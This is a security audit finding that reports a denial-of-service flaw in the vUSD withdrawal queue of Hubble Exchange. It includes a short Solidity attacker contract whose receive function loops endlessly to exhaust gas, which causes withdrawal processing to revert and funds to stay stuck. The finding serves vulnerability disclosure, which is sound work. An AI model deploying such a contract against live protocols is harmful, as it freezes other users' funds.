# Malicious user can DOS vUSD withdrawals

## Summary
A malicious user can block withdrawals from vUSD contract leading to stuck funds.

## Vulnerability Detail
Attacker deploys a malicious contract with a receive function which spends unlimited gas.
Attacker initiates a withdrawal of $5 vUSD to malicious contract.
removeMarginInUSD and withdrawFromInsuranceFund in MarginAccountHelper.sol would revert and the funds currently in the vUSD contract would be stuck.

## Impact
Funds locked because of DoS in vUSD `processWithdrawals` function.

## Code Snippet
https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/VUSD.sol#L75

Attacker contract:
```solidity
contract Attack {
  receive() external payable { 
    uint256 i = 0;
      // this will cause all of the remaining gas units to be spent and the transaction to fail
      while (true) {
          i += 1;
      }
  }
}

```
